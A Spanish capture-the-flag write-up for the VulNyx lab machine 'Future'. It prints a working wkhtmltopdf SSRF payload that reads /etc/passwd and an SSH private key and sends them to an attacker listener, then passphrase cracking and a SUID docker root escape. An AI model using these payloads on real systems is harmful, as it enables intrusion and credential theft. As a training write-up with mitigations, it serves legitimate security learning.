VulNyx — Future
Plataforma: VulNyx
Máquina: Future
Dificultad: Media
Fecha: 2026-11-24
Resumen de la cadena: Enumeración web → descubrimiento de un conversor HTML→PDF (`wkhtmltopdf`) vulnerable a SSRF / LFI ciega mediante subida de archivos → exfiltración de la clave privada SSH de `marty.mcfly` → crackeo de la passphrase con un diccionario generado del propio sitio → acceso SSH → escalada a root abusando del binario `docker` con bit SUID (GTFOBins).
> **Nota sobre la IP:** la VM toma dirección por DHCP y entre reinicios fue `192.168.0.20`, `192.168.0.21` y `192.168.0.24`. Ajustá la IP a la que tengas activa (confirmala con `arp-scan -l` o mirando la consola de la VM).
---
1. Reconocimiento
1.1. Descubrimiento de puertos
Escaneo completo de puertos TCP con nmap:
```bash
sudo nmap -sS -p- -oA port-scanning-full-tcp-192.168.0.20 192.168.0.20
```
Solo dos puertos abiertos: 22 (SSH) y 80 (HTTP). La MAC `08:00:27:...` confirma que es una VM de VirtualBox.
![Descubrimiento de puertos](images/descubrimiento_de_puertos.png)
1.2. Descubrimiento de servicios
Detección de versiones sobre los puertos abiertos:
```bash
sudo nmap -sV -p 22,80 192.168.0.20 -oA service-detection-inicial-192.168.0.20
```
22/tcp → OpenSSH 9.2p1 Debian
80/tcp → Apache httpd 2.4.57 (Debian)
![Descubrimiento de servicios](images/descubrimiento_de_servicios.png)
---
2. Enumeración web (puerto 80)
2.1. Inspección de cabeceras
```bash
curl -I http://192.168.0.20
```
Servidor Apache 2.4.57, respuesta 200 OK, `Content-Length: 1727`.
![Inspección de cabeceras con curl](images/inspecci_n_de_cabeceras_con_curl.png)
2.2. robots.txt
No existe (404):
```bash
curl -i http://192.168.0.20/robots.txt
```
![Inspección de archivo robots no encontrado](images/Inspecci_n_de_archivo_robots_no_encontrado.png)
2.3. Inspección manual de la raíz
La web está completamente tematizada con Volver al Futuro (Back to the Future). La portada muestra el reloj del pueblo con un botón "Click here if you want to go to the FUTURE or the PAST?!".
![Inspección manual en navegador del puerto 80 raíz](images/inspeccion_manual_en_navegador_del_puerto_80_raiz.png)
2.4. Código fuente de la raíz
En el código fuente aparecen rutas interesantes: un botón que redirige a `transition/index.html`, audio en `content/backtothefuture.mp3` e imagen `content/rf.png`.
![Inspección de código fuente raíz puerto 80](images/Inspecci_n_de_c_digo_fuente_ra_z_puerto_80.png)
2.5. Fuzzing de directorios con Gobuster
Diccionario chico (`dirb/common.txt`):
```bash
gobuster dir -u http://192.168.0.21 -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-common-192.168.0.21.txt
```
Encuentra `assets/`, `content/`, `images/` e `index.html`.
![Descubrimiento de directorios con gobuster diccionario chico](images/Descubrimiento_de_directorios_con_gobuster_diccionario_chico.png)
Diccionario medio con extensiones (`directory-list-2.3-medium`):
```bash
gobuster dir -u http://192.168.0.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30 -o gobuster-medium.txt
```
Aparecen archivos clave:
`page.html`
`process.php` (Status 500, Size 0) ← candidato principal
`1885.html`, `1955.html`, `2015.html` (años de la trilogía)
`transition/`
`homework.html`
![Descubrimiento de directorios con gobuster diccionario medio](images/Descubrimiento_de_directorios_con_gobuster_diccionario_medio.png)
2.6. Inspección manual de directorios
/assets (listado habilitado — bootstrap, css, fonts, js):
![Inspección manual en navegador de assets](images/inspeccion_manu_en_en_navegador_de_assets.png)
/content (mp3 e imagen de la temática):
![Inspección manual en navegador de content](images/inspeccion_manu_en_en_navegador_de_content.png)
/images (imágenes de la película):
![Inspección manual en navegador de images](images/inspeccion_manu_en_en_navegador_de_images.png)
page.html → solo muestra "Oops!" en el navegador, pero el valor está en su código fuente:
![Inspección manual en navegador de page.html](images/inspeccion_manu_en_en_navegador_de_pagehtml.png)
El código fuente de `page.html` es la plantilla del ataque previsto — una SSRF ciega que lee un archivo local y lo exfiltra en base64:
```html
<html><body>
<b>Exfiltration via Blind SSRF</b>
<script>
var readfile = new XMLHttpRequest(); // Read the local file
var exfil = new XMLHttpRequest();    // Send the file to our server
readfile.open("GET","file:///home/marty.mcfly/.ssh/id_rsa", true);
readfile.send();
readfile.onload = function() {
    if (readfile.readyState === 4) {
        var url = 'http://192.168.1.45:4444/?data='+btoa(this.response);
        exfil.open("GET", url, true);
        exfil.send();
    }
}
readfile.onerror = function(){document.write('<a>Oops!</a>');}
</script>
</body></html>
```
---
3. Explotación — SSRF / LFI ciega vía subida de HTML
3.1. Relación de process.php con el botón de subida
Inspeccionando `homework.html` con las DevTools se ve que el formulario postea a `process.php` y acepta un archivo `.html`:
```html
<form action="process.php" method="post" enctype="multipart/form-data">
  <input type="file" name="htmlFile" accept=".html">
  <button type="submit">Submit</button>
</form>
```
![Relación del archivo php con el botón de subida de archivos](images/Encuentro_relaci_n_del_archivophp_con_el_boton_de_subida_de_archivos.png)
3.2. Descartando parámetros GET y POST
Antes de confirmar que se trata de una subida de archivo, se prueban parámetros por GET y POST — ninguno responde:
```bash
for p in url uri path file page link target; do
  echo "=== $p ==="
  curl -s "http://192.168.0.21/process.php?$p=http://192.168.0.21/index.html" | head
done
```
![Enumeración de parámetros por GET](images/enumeraci_n_de_par_metros_por_GET.png)
```bash
for p in url uri path file page link target data; do
  echo "=== $p ==="
  curl -s -X POST "http://192.168.0.21/process.php" --data "$p=http://192.168.0.21/index.html" | head
done
```
![Enumeración de parámetros por POST](images/enumeraci_n_de_par_metros_por_POST.png)
Conclusión: el vector no es un parámetro de texto, sino la subida del archivo HTML que luego se renderiza del lado del servidor.
3.3. Análisis de la petición de Submit
Interceptando el envío del formulario con Burp Suite, la respuesta devuelve:
```
Error: PDF file does not exist after conversion.
```
Y el `User-Agent` de la petición saliente del servidor es `wkhtmltopdf`. Esto confirma el mecanismo: `process.php` convierte el HTML subido a PDF con `wkhtmltopdf` (motor WebKit), y durante esa conversión ejecuta el JavaScript del lado del servidor. Por eso el JS con `file://` puede leer archivos locales — es una SSRF/LFI ciega.
![Análisis de petición de submit](images/analisis_de_petici_n_de_submit.png)
3.4. Preparación del exploit
Se adapta la plantilla de `page.html` apuntando el `btoa` a la IP del atacante (Kali):
```bash
cat > exploit.html <<'EOF'
<html><body>
<script>
var readfile = new XMLHttpRequest();
var exfil = new XMLHttpRequest();
readfile.open("GET","file:///etc/passwd", true);
readfile.send();
readfile.onload = function() {
    if (readfile.readyState === 4) {
        var url = 'http://192.168.0.23:4444/?data='+btoa(this.response);
        exfil.open("GET", url, true);
        exfil.send();
    }
}
readfile.onerror = function(){document.write('<a>Oops!</a>');}
</script>
</body></html>
EOF
```
Se levanta un listener para recibir la exfiltración:
```bash
python3 -m http.server 4444
```
Y se sube el archivo (por el formulario de `homework.html` con Browse → Submit, o por consola):
```bash
curl -s -F "htmlFile=@exploit.html;type=text/html" http://192.168.0.21/process.php
```
3.5. Confirmación de la exfiltración en el listener
El servidor renderiza el HTML, ejecuta el JS, lee el archivo y envía su contenido en base64 al listener:
![Confirmo que recibo cadena en base64 en listener](images/confirmo_qu_recibo_cadena_en_base_64_en_listener.png)
3.6. Lectura de /etc/passwd
Decodificando la cadena base64:
```bash
echo 'CADENA_BASE64' | base64 -d
```
Se obtiene el `/etc/passwd`, donde se confirman dos usuarios con shell:
`marty.mcfly:x:1000:1000::/home/marty.mcfly:/bin/bash`
`emmett.brown:x:1001:1001::/home/emmett.brown:/bin/bash`
![Veo /etc/passwd en base64](images/veo_etcpasswd_en_base64.png)
![Veo /etc/passwd en base64 (2)](images/veo_etcpasswd_en_base64_2.png)
3.7. Exfiltración de la clave privada SSH
Se repite el proceso cambiando la ruta del exploit a la clave privada de marty:
```
readfile.open("GET","file:///home/marty.mcfly/.ssh/id_rsa", true);
```
Tras subir el archivo y recibir la respuesta en el listener, se decodifica el base64 a un archivo `id_rsa`:
```bash
echo 'CADENA_BASE64' | base64 -d > id_rsa
head -1 id_rsa     # -----BEGIN OPENSSH PRIVATE KEY-----
```
---
4. Crackeo de la passphrase de la clave
La `id_rsa` está protegida con passphrase. Se extrae el hash para John:
```bash
chmod 600 id_rsa
ssh2john id_rsa > hash
```
![Cracking contraseña 1](images/craking_contrase_a_1.png)
La passphrase no está en `rockyou` de forma práctica (clave OpenSSH con bcrypt, muy lenta), así que se genera un diccionario a partir del propio sitio con `cewl`, aprovechando que todo el contenido está tematizado:
```bash
TARGET=192.168.0.21
cewl -m 3 http://$TARGET/index.html    > w_index.txt
cewl -m 3 http://$TARGET/page.html     > w_page.txt
cewl -m 3 http://$TARGET/1885.html     > w_1885.txt
cewl -m 3 http://$TARGET/1955.html     > w_1955.txt
cewl -m 3 http://$TARGET/2015.html     > w_2015.txt
cewl -m 3 http://$TARGET/homework.html > w_homework.txt

cat w_*.txt | sort -u > wordlistcomplete.txt
wc -l wordlistcomplete.txt     # 161 palabras
```
![Cracking contraseña 2](images/craking_contrase_a_2.png)
Se crackea con John usando ese diccionario:
```bash
john --wordlist=wordlistcomplete.txt hash
john --show hash
```
Resultado:
```
id_rsa:inadvertently
```
La passphrase es `inadvertently` (una palabra tomada del texto de las propias páginas del sitio).
![Cracking contraseña 3](images/craking_contrase_a_3.png)
---
5. Acceso inicial (user)
Con la clave y la passphrase se accede por SSH como `marty.mcfly`:
```bash
ssh -i id_rsa marty.mcfly@192.168.0.24
# Enter passphrase for key 'id_rsa': inadvertently
```
![Solicita contraseña luego de usar conexión SSH con la clave](images/solicita_contrase_a__uego_de_usar_conexion_ssh_con_la_clave.png)
Acceso conseguido (Linux `future`, Debian 6.1):
![Ingreso SSH de marty.mcfly](images/ingreso_ssh_de_martymcfly.png)
Flag de usuario:
```bash
cat user.txt
# fe12df45c64c362ec68abd9c27467e35
```
![Obtengo flag user.txt](images/obtengo_flag_usertxt.png)
---
6. Escalada de privilegios (root)
6.1. Búsqueda de binarios SUID
```bash
find / -perm -4000 2>/dev/null
id | grep -i docker
```
Entre los binarios SUID aparece `/usr/bin/docker`, que no debería tenerlo. El usuario no pertenece al grupo `docker`, pero el bit SUID alcanza para ejecutarlo como root:
```bash
ls -l /usr/bin/docker
# -rwsr-xr-x 1 root root 45582984 ... /usr/bin/docker
```
![Busco binarios SUID](images/busco_binarios_suid.png)
6.2. Docker escape (GTFOBins)
Según GTFOBins, se monta el filesystem del host dentro de un contenedor y se hace `chroot`, obteniendo una shell como root sobre el sistema real:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
```
# whoami
root
# cd /root
# ls
root.txt
```
![Confirmo root en docker](images/confirmo_root_en_docker.png)
6.3. Flag de root
```bash
cat /root/root.txt
```
![Obtengo root.txt](images/obtengo_roottxt.png)
---
7. Mitigaciones
Conversor HTML→PDF: ejecutar `wkhtmltopdf` con `--disable-local-file-access` (o migrar a una herramienta que no permita `file://` ni acceso a recursos internos). Nunca renderizar HTML suministrado por el usuario sin aislar el proceso.
Claves SSH: no almacenar claves privadas en rutas legibles/predecibles, y protegerlas con passphrases robustas que no deriven del contenido público del sitio.
Listado de directorios: deshabilitar el autoindex de Apache (`Options -Indexes`).
SUID en docker: quitar el bit SUID del binario `docker` y restringir el acceso al daemon solo a administradores. La pertenencia al grupo `docker` (o un `docker` SUID) equivale a acceso root.
---
8. Resumen de la cadena de ataque
Fase	Técnica
Reconocimiento	nmap — puertos 22/80
Enumeración web	gobuster → `process.php`, `page.html`, `homework.html`
Explotación	SSRF/LFI ciega vía subida de HTML renderizado por `wkhtmltopdf`
Exfiltración	lectura de `/etc/passwd` e `id_rsa` en base64 a un listener
Credenciales	`ssh2john` + diccionario con `cewl` del sitio → passphrase `inadvertently`
Acceso	SSH como `marty.mcfly`
Escalada	binario `docker` con SUID → GTFOBins → root
